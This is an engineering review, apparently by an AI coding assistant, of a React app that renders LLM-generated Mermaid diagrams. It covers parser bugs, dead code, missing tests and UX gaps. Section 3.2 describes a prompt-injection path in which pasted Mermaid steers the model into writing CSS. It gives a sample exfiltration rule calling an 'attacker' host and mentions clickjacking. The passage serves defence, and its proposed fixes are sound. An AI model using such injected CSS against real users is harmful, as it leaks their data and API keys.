# PulseGraph — End-to-End Analysis

**Date:** 2026-08-16 · **Commit:** `2e62ff4` (+ 18 uncommitted files) · **Scope:** `src/` (~3,900 LOC, 15 TS/TSX files)

**Verification status:** `tsc -b` passes clean. Parser findings in §3 were reproduced by executing the real
`parseMermaid` / `roleBlueprintLayout` code against fixtures — the outputs quoted below are actual program
output, not inference. `vite build` and `eslint` could not be run in the analysis sandbox (the installed
`rolldown` / native binaries are Windows-only), so bundle size and lint results are unverified.

---

## 1. Executive summary

PulseGraph is a well-conceived, single-page, zero-backend tool with a genuinely good idea at its core: an
LLM turns intent into Mermaid, a deterministic parser turns Mermaid into a graph, and two independent
renderers give you either a live animated canvas or a static slide-quality PNG. The separation between
"LLM does semantics, TypeScript does geometry" is the right architectural call and it's held up.

The problems are concentrated in one place. **The deterministic Mermaid parser silently mangles four
common syntax forms**, including one that appears in the app's own example buttons on the landing page.
Everything downstream is correct given a correct graph — the graph is often not correct.

Ranked by what I'd fix first:

| # | Issue | Severity | Where |
|---|---|---|---|
| 1 | Chained edges (`A --> B --> C`) create a garbage node — breaks example pill #1 | **Critical** | `mermaidParser.ts:240` |
| 2 | `A -- text --> B` and `A & B --> C` create garbage nodes; `A --- B` yields a blank canvas | **Critical** | `mermaidParser.ts:216` |
| 3 | LLM-authored CSS injected via `dangerouslySetInnerHTML` into a page holding the API key | **High** | both canvases |
| 4 | Export failures are silent (console only) — user sees nothing happen | **High** | `App.tsx:212` |
| 5 | No tests, no CI, on pure functions that are trivially testable | **High** | — |
| 6 | Step badges likely don't paint until the user clicks the canvas | Medium | both canvases |
| 7 | ~250 identical lines duplicated between the two canvas components | Medium | `components/` |
| 8 | 254 lines of dead code + 3 unused runtime dependencies | Medium | — |
| 9 | Nothing persists — refresh loses the diagram and the whole chat | Medium | `App.tsx` |
| 10 | Mermaid panel is read-only; every edit costs an LLM round trip | Medium | `App.tsx:341` |

---

## 2. Architecture walkthrough

### 2.1 Shape of the system

No backend, no server, no database. A Vite + React 19 SPA that talks directly to DeepSeek's HTTPS API or
a local Ollama at `localhost:11434`. The API key lives in `localStorage`. All application state lives in
`App.tsx` as 21 `useState` hooks — there is no store, no context, no reducer.

### 2.2 The two pipelines

**Pipeline A — chat to animated diagram** (the default path, `submitMessage`):

```
user text
  │
  ├─ looksLikeMermaid()? ──yes──► skip Pass 1, wrap verbatim as JSON
  │                        no ──► Pass 1: GENERATE_PROMPT → LLM → {mermaidCode, animationSteps, aiAnimations}
  │
  ├─ off-topic guard (mermaidCode === "OFFTOPIC")
  ├─ Pass 2: VALIDATE_PROMPT → LLM  (always runs, even for user-pasted Mermaid)
  ├─ parseMermaid()          ← deterministic, zero LLM
  ├─ computeLayout()         ← Dagre, purely topological
  └─ <RichDiagramCanvas> / <DiagramCanvas>  → GSAP animation
                                            → gifExporter → PNG / GIF
```

**Pipeline B — AI Presentation to slide PNG** (`handleDesignPresentation` → `handleExportBlueprint`):

```
current mermaidSource
  ├─ DESIGN_PROMPT → LLM → {mermaidCode, roles, ...}   roles: lead-in|pipeline|service|output
  ├─ parseMermaid()
  ├─ roleBlueprintLayout(graph, roles)   ← semantic, not topological
  ├─ setPresentationRoles(roles)          ← unlocks the Export PNG button
  └─ buildBlueprintSvg() → offscreen <canvas> → 2× PNG download
```

The design instinct here is sound: the LLM is used for *judgement* (what does this node mean, what colour
should it be, is it a pipeline stage or a side service) and TypeScript is used for *geometry*. That's why
the role system works and why the removed manual "Blueprint" toggle didn't — a topological grid has no
opinion about meaning. Keep this boundary.

### 2.3 Module map

| Module | LOC | Role | Health |
|---|---|---|---|
| `App.tsx` | 403 | All state, all orchestration, all header UI | Doing too much |
| `services/llmService.ts` | 262 | Prompts, provider routing, JSON repair | Good separation |
| `parser/mermaidParser.ts` | 266 | Mermaid → `Graph` | **Weakest link** |
| `parser/layoutEngine.ts` | 378 | `computeLayout` (Dagre) + `roleBlueprintLayout` (semantic) | Solid, some dead code |
| `components/RichDiagramCanvas.tsx` | 860 | Animated glassmorphism renderer | Largest file; duplicated |
| `components/DiagramCanvas.tsx` | 540 | Animated classic renderer | Near-duplicate of the above |
| `render/blueprintSvg.ts` | 187 | Static slide SVG | Clean, well-scoped |
| `services/gifExporter.ts` | 422 | PNG/GIF rasterisation, font inlining, quantisation | Dense but genuinely hard-won |
| `components/ChatPanel.tsx` | 139 | Chat UI | Fine |
| `components/ApiKeyModal.tsx` | 121 | Provider config | Fine |
| `ArchitectureDiagram.tsx` | 178 | **Dead** — never imported | Delete |
| `services/gifWorker.ts` | 76 | **Dead** — never imported | Delete |

### 2.4 What's genuinely good

- **`gifExporter.ts` earns its complexity.** Inlining the Google Font as base64, setting the root
  `viewBox` to the exact target pixel dimensions to defeat browser SVG downscaling, and the
  `getFastPalette` 10k-pixel sampler (documented as a ~100× speedup) are all real fixes to real
  browser-specific problems, and each carries a comment explaining *why*. This is the best-documented
  code in the repo.
- **Cycle handling is correct.** `computeLayout` runs its own DFS to find back-edges, hides them from
  Dagre so it only ever sees a DAG, then hand-routes them as bezier curves with per-edge vertical offsets
  so multiple back-edges don't stack. Self-loops (`A --> A`) are correctly caught.
- **Coordinate normalisation** (`layoutEngine.ts:195-218`) sweeps nodes, edge points *and* group boxes to
  find the true minimum, then translates everything to a symmetric 40px margin. That's why negative
  back-edge coordinates don't get clipped on export.
- **The Export PNG button UX rule** (always visible, `disabled` with an explanatory tooltip) is the right
  call and `CLAUDE.md` correctly records why.

---

## 3. Correctness and bug risks

### 3.1 CRITICAL — the Mermaid parser mangles common syntax

`parseEdgeLine` (`mermaidParser.ts:216-254`) handles exactly one arrow per line and assumes whatever sits
on either side is a single node token. Four very common Mermaid forms break. **These are real outputs from
running `parseMermaid` on the fixtures:**

**(a) Chained edges — `A --> B --> C`**

```
input:  B -->|No| D[Debug] --> B
nodes:  A::"Start"  |  B::"Q"  |  D[Debug] --> B :: "D[Debug] --> B"   ← garbage node
edges:  A->B  |  B->"D[Debug] --> B"
```

The lazy `^(.*?)` matches at the *first* arrow, so everything after it becomes one node id. The graph gets
a node literally labelled `D[Debug] --> B`, and the `D → B` loop is lost entirely.

**This exact line is `EXAMPLES[0]` in `App.tsx:21`** — the first example pill on the landing page. A new
user's first click produces a visibly broken diagram.

**(b) `A -- text --> B`** (the most common labelled-edge form in the wild)

```
input:  A[User] -- sends request --> B[API]
nodes:  "A[User] -- sends request"  |  B::"API"     ← garbage node
```

**(c) `A & B --> C`** (multi-source shorthand)

```
input:  A & B --> C
nodes:  "A & B"  |  C     ← one fused garbage node instead of two
```

**(d) `A --- B`** (open/undirected link) — `arrowRe` requires a trailing `>`, so the line matches nothing
and falls through:

```
input:  flowchart LR / A --- B
nodes:  (empty)     edges:  (none)      ← completely blank canvas, no error
```

**Why this hurts more than it looks.** The failure mode is *silent*. There is no "I couldn't parse line 4"
anywhere in the pipeline. The user sees a diagram with a weird extra box and assumes the AI is bad, when
the AI produced perfectly valid Mermaid and the parser dropped it.

**Fix.** Rewrite `parseEdgeLine` as a tokeniser that splits a line on *all* link operators and emits
`n-1` edges for `n` tokens, with the operator grammar handled properly:

```
link := ('--' | '==' | '-.') text? ('--' | '==' | '.-')? ('>' | 'o' | 'x')?
```

Then split each side on `&`. Add a `warnings: string[]` field to `Graph` for anything that still doesn't
parse, and surface it in the chat panel instead of swallowing it. Lock the behaviour in with unit tests
(§4.3) — this module is a pure function, it is the easiest thing in the codebase to test.

### 3.2 HIGH — LLM-authored CSS is injected into the live DOM

`RichDiagramCanvas.tsx:724-726` and `DiagramCanvas.tsx` (same block):

```tsx
{graph.aiAnimations?.cssKeyframes && (
  <style dangerouslySetInnerHTML={{ __html: graph.aiAnimations.cssKeyframes }} />
)}
```

`cssKeyframes` is a raw string the model was explicitly told to author freely (`GENERATE_PROMPT` line 16:
*"You have full freedom to write CSS keyframes"*). It goes into the DOM unsanitised.

The threat is prompt injection, and it is not theoretical for this app: pasting a Mermaid diagram from an
untrusted source (a colleague, a GitHub README, a doc) puts attacker-controlled text directly into the
prompt. Injected CSS can exfiltrate via `background: url(https://attacker/?d=...)`, and can reposition or
cover UI elements for clickjacking. This shares a page with a DeepSeek API key in `localStorage`.

**Fix, cheapest first:** (1) allowlist-parse the string, accepting only `@keyframes` blocks and class rules
over a fixed property set (`transform`, `opacity`, `filter`, `animation*`), rejecting `url(`, `@import`,
`expression`, `behavior`; (2) or drop `cssKeyframes` entirely and have the model pick from a fixed catalogue
of named effects (`float` / `pulse` / `glow` / `shake`) that ship as static CSS. Option 2 removes the class
of bug and loses almost nothing — the model reliably reaches for the same four effects anyway.

### 3.3 HIGH — export failures are invisible

`App.tsx:212`:

```ts
} catch (err) { console.error(`${type.toUpperCase()} export failed:`, err); }
```

The progress bar resets and nothing else happens. There's an `error` state and an `.error-msg` renderer
already in the file — but `.error-msg` is only rendered inside the `appState === 'idle'` block
(`App.tsx:397`), which by definition is never on screen when the export buttons are. So even
`setError(msg)` wouldn't be visible here.

`handleExportBlueprint` (152-175) is worse: the `img.onerror` rejection has no `.catch` at all — a failed
SVG rasterisation produces an unhandled promise rejection and total silence. It also has no
`isExporting` state, so a slow render looks like a dead button.

**Fix.** Promote `error` to a toast rendered at the app level regardless of `appState`, set it in both
export handlers, and give `handleExportBlueprint` the same `isExporting` treatment as `handleExport`.

### 3.4 MEDIUM — step badges probably don't paint on first render

Both canvases compute topological levels inside a `useEffect` and stash them by mutating the prop object:

```ts
// RichDiagramCanvas.tsx:483  (inside useEffect)
(graph as any).computedLevels = nodeLevels;

// RichDiagramCanvas.tsx:812  (during render)
const computedLevels = (graph as any).computedLevels as Map<string, number> | undefined;
const stepNumber = computedLevels?.has(node.id) ? computedLevels.get(node.id)! + 1 : null;
```

The effect runs *after* the first paint and triggers no state update, so on that first paint
`computedLevels` is `undefined` and every badge renders as `null`. They should appear only once something
else forces a re-render — and the first thing that does is `setIsDragging(true)` on mousedown. Net effect:
**the numbered step badges are missing until the user clicks the canvas.**

I reasoned this from the code rather than observing it in a browser, so confirm in the dev server before
acting — but the fix is right either way: level computation is a pure function of `graph`, so lift it out
of the effect into a `useMemo` and pass it down. That also removes two of the five `as any` casts in the
codebase.

### 3.5 MEDIUM — parallel edges collapse into one

`computeLayout:112` calls `g.setEdge(e.from, e.to, {id: e.id})`. Dagre keys edges by `(v, w)` unless you
pass a `name` argument, so a second `A → B` overwrites the first. Then `g.edge(e.from, e.to)` at line 177
returns the *same* point array for both, and they render exactly on top of each other.

Verified: `A -->|one| B` + `A -->|two| B` parses into two distinct edges, then both get identical geometry.
Both labels draw at the same midpoint, on top of each other. Fix: pass `e.id` as dagre's fourth `name`
argument and read back with `g.edge(e.from, e.to, e.id)`.

### 3.6 MEDIUM — GIF duration is fixed at 3s but animations can run longer

`exportGif` hardcodes `duration = 3` (`App.tsx:201`). Node entry animations are delayed by
`level * 0.6` seconds (`RichDiagramCanvas.tsx:504`). Any graph deeper than ~5 levels is still animating
in when the GIF ends, so the exported loop shows a half-built diagram.

**Fix.** Derive duration from the graph: `maxLevel * 0.6 + 2.0`, clamped to something sane like 12s. Or
expose a duration control next to the existing frame-size dropdown.

### 3.7 LOW — assorted

- **`computeLayout:122-131`** — `globalMinX` and `globalMaxY` are computed in a full node sweep and then
  never read. Dead code left over from a superseded normalisation pass (the live one is at line 195).
  `noUnusedLocals` doesn't catch assigned-but-unread variables.
- **`mermaidParser.ts:28`** — `if (sig === '[(])' || open === '[(')`. The literal `'[(])'` is a typo for
  `'[(' + ')]'` and can never match. Harmless (the second clause carries it) but misleading.
- **`mermaidParser.ts:36`** — `if (sig === '((' + '))') return 'user';` is an exact duplicate of line 27
  and is unreachable.
- **`App.tsx:89`** — `{ ...graph, mermaidSource } as Graph & {...}`. When `graph` is `null`, spreading it
  yields `{ mermaidSource: '' }`, which is truthy, so `llmService.ts:167` always appends a
  *"Context (current diagram Mermaid — refine it based on the request)"* block — even on the very first
  message, where the context is empty. Minor prompt pollution on every cold start. Pass `null` explicitly.
- **Pass 2 always runs.** When `looksLikeMermaid` is true the code skips Pass 1 but still sends the user's
  own Mermaid to `VALIDATE_PROMPT` (`llmService.ts:195`). That doubles latency and cost for paste-in users
  and gives the model licence to rewrite input that was already correct. Skip Pass 2 when the input parsed
  cleanly.
- **No error boundary anywhere.** One throw inside a canvas component white-screens the whole app with no
  recovery path.
- **`roleBlueprintLayout:286`** — nodes inside a cycle never enter the Kahn queue, so they all fall back to
  `level = 0` and sort to the front of their role band. Minor ordering artifact.
- **`blueprintSvg.ts:102-103`** — canvas size comes from the node bbox only; edge control points and the
  pipeline container rect are outside that calculation. The current constants leave enough slack that
  nothing clips, but the margin is incidental rather than guaranteed.
- **RL/BT directions are silently remapped.** `mermaidParser.ts:93` maps `RL` → `LR`; `BT` isn't handled at
  all. A right-to-left diagram renders left-to-right with no warning.

---

## 4. Code health and tech debt

### 4.1 Dead code and unused dependencies — delete on sight

| Item | Size | Evidence |
|---|---|---|
| `src/ArchitectureDiagram.tsx` | 178 LOC | Only occurrence of the name is its own `export` |
| `src/services/gifWorker.ts` | 76 LOC | Never imported; README says encoding moved to the main thread |
| `src/App.css` | 1 line | Never imported (`main.tsx` imports `index.css` only) |
| `public/icons.svg`, `src/assets/hero.png`, `react.svg`, `vite.svg` | — | No references in `src/` or `index.html` |
| `html-to-image` dep | runtime | Never imported. README lists it as "fallback" — it isn't wired up |
| `mermaid-ast` dep | runtime | Never imported |
| `@mermaid-js/parser` dep | runtime | Never imported |

Three unused packages in `dependencies` (not `devDependencies`) means they're in the bundle graph and the
lockfile, and they carry transitive supply-chain surface for zero benefit. `getFastPalette` is also
duplicated verbatim between `gifExporter.ts:267` and the dead `gifWorker.ts:20`.

### 4.2 Duplication between the two canvases

`DiagramCanvas.tsx` (540 LOC) and `RichDiagramCanvas.tsx` (860 LOC) share **250 identical lines** after
normalising whitespace — 63% of the smaller file. Duplicated wholesale:

- `pointsToPath`, `wrapLabel`, `parseLabel`
- the entire pan/zoom block: `applyTransform`, `handleMouseDown/Move/Up`, the native non-passive wheel
  listener with its `requestAnimationFrame` throttle and trackpad-vs-mouse sensitivity heuristic,
  `handleZoomIn/Out/Reset`
- the initial fit-to-viewport calculation, including the `0.3`/`2.6` clamp and its comment
- the Kahn's-algorithm level computation and the `(graph as any).computedLevels` mutation
- the zoom-control button JSX with its three inline SVG icons
- group rendering and the step-badge block

The label-wrapping logic exists in a **third** near-identical copy as `getLabelLines` in
`layoutEngine.ts:10` and a **fourth** as `labelLines` in `blueprintSvg.ts:33`. `smoothPath`
(`blueprintSvg.ts:46`) is a fifth copy of `pointsToPath`.

This is the classic layout bug factory: fix the wrapping in one renderer, the export still shows the old
behaviour, and nobody notices for weeks.

**Fix.** Extract in this order (cheapest first, each independently shippable):

1. `src/lib/labelText.ts` — one `wrapLabel(label, maxWidthPx)` used by all four sites.
2. `src/lib/path.ts` — one `pointsToPath`.
3. `src/hooks/usePanZoom.ts` — returns `{containerRef, transformRef, isDragging, zoomIn, zoomOut, reset}`.
   This alone removes ~120 lines from each canvas.
4. `src/lib/graphLevels.ts` — pure `computeLevels(graph): Map<string, number>`, consumed via `useMemo`
   (this also fixes §3.4).
5. Then reconsider whether Classic and Rich should be two components at all, or one component with a
   `variant` prop and two style tables — the *structure* is identical, only `NODE_STYLES` and the icon set
   differ.

### 4.3 No tests, no CI

There is no test runner in `devDependencies` and no test file in the repo. This is the largest process gap,
and it is unusually cheap to close here because the highest-risk code is pure:

```
parseMermaid(string) → Graph            ← where every bug in §3.1 lives
computeLayout(Graph) → Graph
roleBlueprintLayout(Graph, roles) → Graph
buildBlueprintSvg(Graph, roles) → string
computeExportGeometry(w, h, frame, scale) → {targetW, targetH, transform}
```

Add Vitest (it shares Vite's config, so setup is ~5 lines) and start with a table-driven suite over
`parseMermaid` covering every form in §3.1 plus the shape mappings in the README's own node-type table.
That table is effectively a written spec that nothing currently enforces.

For layout, use the headless verification recipe already documented in `CLAUDE.md` §"Verifying layout/SVG
changes without a browser session" — assert invariants rather than pixels: no two node boxes overlap, no
zone box overlaps another, all coordinates ≥ 0, every edge endpoint lands on a node boundary. That's stable
under design tweaks in a way that snapshot tests aren't.

Then a GitHub Action running `tsc -b && eslint . && vitest run` on push.

### 4.4 `App.tsx` is carrying too much

403 lines holding 22 `useState` hooks, all LLM orchestration, two separate export flows, and the entire
header UI. The header alone is ~80 lines of JSX with five separate `{graph && (...)}` guards
(lines 244, 250, 274, 290, 295) that should be one guard around one `<DiagramToolbar>`.

Suggested split — no behaviour change, purely mechanical:

- `useDiagramSession()` — graph, mermaidSource, messages, presentationRoles, submitMessage,
  designPresentation. Keeps the §3.4-adjacent invariant (roles reset on new graph) in one auditable place.
- `useExport()` — isExporting, exportProgress, gifUrl, exportFrame, and both export handlers.
- `<AppHeader>` — presentational.

### 4.5 Type safety leaks

- Four `as any` casts in live code — all four exist to smuggle `computedLevels` onto the `Graph` object
  (`DiagramCanvas.tsx:200,496` and `RichDiagramCanvas.tsx:483,812`) and all four disappear if §3.4 is
  fixed properly.
- `mermaidSource` is attached to `Graph` by cast (`llmService.ts:217`) rather than declared on the
  interface, so three call sites do `(graph as Graph & { mermaidSource: string })`. Just add
  `mermaidSource?: string` to the `Graph` interface.
- `src/gifenc.d.ts` is `declare module 'gifenc'` — an untyped escape hatch. `gifenc` ships types; try
  importing them before hand-rolling a shim.
- `types.ts:36` — `OllamaModel = 'gemma3:4b' | 'gemma4:e4b'`. A closed union of two hardcoded model names
  means adding a model requires a type change, a `<select>` change, and a rebuild. Should be `string` with
  a suggested list, ideally fetched from `/api/tags` on the local Ollama.

### 4.6 Repo hygiene

- **18 modified files are uncommitted**, spanning every source file plus `CLAUDE.md` and `README.md`. An
  entire working session — including the whole AI Presentation / blueprint feature — is unversioned. If
  this folder is lost, so is the feature. Commit it.
- The last two commits are `2e62ff4` and `75cdc24`, both titled *"Refactor GIF export to main thread and
  update README"* — a duplicated commit.
- No Prettier or EditorConfig; the codebase mixes CRLF and LF and mixes 2-space with compact
  multi-statement lines (`layoutEngine.ts:274` puts two `const` declarations on one line).
- `README.md` is out of date in two places: it lists `html-to-image` in the tech stack as a "fallback"
  (unused), and describes the Web Worker GIF path that was replaced.
- `CLAUDE.md` is, by contrast, unusually good — it records *why* decisions were made (why the Blueprint
  toggle was removed, why there are two renderers, the stale-roles gotcha) rather than just what the code
  does. Keep maintaining it.

---

## 5. Feature and UX gaps

### 5.1 The three that would change how the product feels

**Nothing survives a refresh.** No graph, no chat history, no Mermaid source. The app already writes four
keys to `localStorage` (API key, provider, model, theme) — extending that to the current session is a
small change with a large payoff, since users treat a diagram they spent five LLM calls refining as work
product, not a scratch buffer. Add a "Recent diagrams" list keyed off the same store and undo/history
becomes nearly free.

**The Mermaid panel is read-only.** `App.tsx:341` renders the source into a `<pre>` with a copy button.
So changing one label — a five-character edit — requires a natural-language request, two LLM calls, a
re-parse, and a re-layout, with a real chance the model changes something else in passing (the
`VALIDATE_PROMPT` has an explicit *"DO NOT alter the topology"* rule precisely because this happens).
Make the panel a `<textarea>` with an "Apply" button that runs `parseMermaid` → `computeLayout` directly,
no LLM. It's a small change that turns the AI from a mandatory gate into an accelerator, and it makes the
tool usable when the API key runs out.

**No SVG export.** Only raster PNG and GIF. The whole pipeline is already SVG end to end — `buildBlueprintSvg`
literally returns an SVG string that is then thrown away after rasterising. Exposing "Download SVG" is
close to a one-line addition and gives users something they can drop into Figma, Keynote or a docs site
and keep sharp at any size. This is the single highest value-per-line item on the list.

### 5.2 Interaction gaps

- **No touch support.** Pan/zoom is wired to `onMouseDown/Move/Up` plus a `wheel` listener. No
  `PointerEvent`, no `touchstart`, no pinch. The app is unusable on a tablet — and a diagram viewer is
  exactly the sort of thing people open on an iPad. Switching to Pointer Events is mostly a rename.
- **No node dragging.** When the auto-layout puts one box awkwardly, there is no recourse but to re-prompt.
  Given `CLAUDE.md`'s (correct) rule against adding another user-facing layout *mode*, per-node manual
  nudging is the right escape hatch — it's a local override, not a competing global strategy.
- **No accessibility.** The SVG has no `<title>`/`<desc>`/`role="img"`, no node is focusable, and most
  buttons are labelled with emoji (`⚡`, `✨`, `⬇`, `☀️`). Screen readers get nothing. Minimum viable fix:
  `<title>` on the SVG, `aria-label` on every icon button, and a visually-hidden `<ol>` describing the
  flow as text.
- **No keyboard shortcuts** — not even Ctrl+Enter to send or Escape to close the Mermaid panel.

### 5.3 Configuration gaps

- **Two providers, both hardcoded.** URLs are module constants (`llmService.ts:4-5`). No OpenAI, Anthropic,
  Groq, or OpenRouter, and no way to add one without a code change — despite all of them speaking the same
  OpenAI-compatible `/chat/completions` shape the code already uses. A `{name, baseUrl, model, keyRequired}`
  config array would make this data instead of code.
- **The API key isn't validated until first use.** A typo'd key sails through the modal and surfaces as a
  raw `DeepSeek API 401: {...}` in a chat bubble. A one-token ping on save would catch it at the right
  moment.
- **`gemma4:e4b`** in the Ollama dropdown doesn't correspond to a model I can identify — worth checking
  whether that's a typo for `gemma3n:e4b`.
- **Blueprint PNG title is hardcoded** to `'Architecture Flow'` (`App.tsx:154`), even though
  `buildBlueprintSvg` accepts `{title, subtitle}`. One input field away from being useful.
- **GIF is fixed at 3s / 15fps.** No control, and see §3.6 for why the default is wrong for large graphs.

### 5.4 Scale ceilings

Untested above roughly 30 nodes. Three specific concerns:

- `roleBlueprintLayout` puts the entire pipeline in **one horizontal row** (`layoutEngine.ts:303`). A
  12-stage pipeline is ~2,600px wide and unreadable on a 16:9 slide. Needs row-wrapping past a threshold.
- Every edge gets a perpetually-looping GSAP motion-path tween plus a repeating dash animation. At ~100
  edges that's 200+ concurrent tweens driving SVG filter re-rasterisation every frame.
- GIF export rasterises the full SVG 45 times through `Image` → `canvas`, each at up to 4096px. On a large
  diagram this is minutes of main-thread work. The `gifWorker.ts` that would have fixed this is dead code
  in the repo — the README says it was abandoned over "Web Worker caching and path resolution bugs",
  which Vite's `new Worker(new URL('./gifWorker.ts', import.meta.url), {type: 'module'})` form handles.
  Worth a second attempt if large-graph GIF export matters.

---

## 6. Suggested order of work

**First — stop the bleeding (a day or two).**

1. Rewrite `parseEdgeLine` as a proper link tokeniser; add `Graph.warnings` and surface unparsed lines in
   the chat panel. (§3.1)
2. Add Vitest and a table-driven `parseMermaid` suite covering every case in §3.1 and the README's node
   shape table. Do this *with* step 1, not after. (§4.3)
3. Commit the 18 outstanding files. (§4.6)
4. Sanitise or eliminate `cssKeyframes`. (§3.2)
5. Surface export errors; add a `catch` to `handleExportBlueprint`. (§3.3)

**Second — cheap wins (a day).**

6. Delete `ArchitectureDiagram.tsx`, `gifWorker.ts`, `App.css`, unused assets, and the three unused deps. (§4.1)
7. Add "Download SVG". (§5.1)
8. Make the Mermaid panel editable with a no-LLM Apply. (§5.1)
9. Persist session to `localStorage`. (§5.1)
10. Derive GIF duration from graph depth. (§3.6)

**Third — structural (a week, incremental).**

11. Extract `usePanZoom`, `labelText`, `path`, `graphLevels`; this fixes §3.4 as a side effect. (§4.2)
12. Split `App.tsx` into two hooks plus `<AppHeader>`. (§4.4)
13. Fix parallel-edge collapse via dagre edge names. (§3.5)
14. Add an error boundary. (§3.7)
15. Pointer Events for touch. (§5.2)
16. CI running `tsc -b && eslint . && vitest run`. (§4.3)

**Later — product direction.**

17. Provider config as data. (§5.3)
18. Pipeline row-wrapping in `roleBlueprintLayout`. (§5.4)
19. Manual node nudging. (§5.2)
20. Accessibility pass. (§5.2)

---

## 7. Open questions worth confirming

1. **§3.4 (step badges)** — does the numbered badge appear on first paint, or only after you click the
   canvas? Reasoned from code, not observed in a browser.
2. **`handleExportBlueprint` sharpness** — it sets `img.width = w * scale` and then calls the 5-argument
   `ctx.drawImage(img, 0, 0, canvas.width, canvas.height)`. That's the bitmap-upscale path that
   `gifExporter.ts` explicitly documents as producing blurry output, and which it works around by setting
   the root `viewBox` to the target pixel dimensions. If blueprint PNGs look softer than canvas PNGs,
   that's why — reuse the `serializeFrameSvg` approach.
3. **Is `mermaid-ast` / `@mermaid-js/parser` an abandoned plan or a future one?** The README describes a
   "Universal Lexer Engine & AST Parser" but `mermaidParser.ts` is hand-rolled regex. If the intent was to
   adopt the official parser, that would resolve all of §3.1 at a stroke and is worth evaluating before
   investing in a hand-written tokeniser.
4. **`gemma4:e4b`** — real model, or a typo for `gemma3n:e4b`?
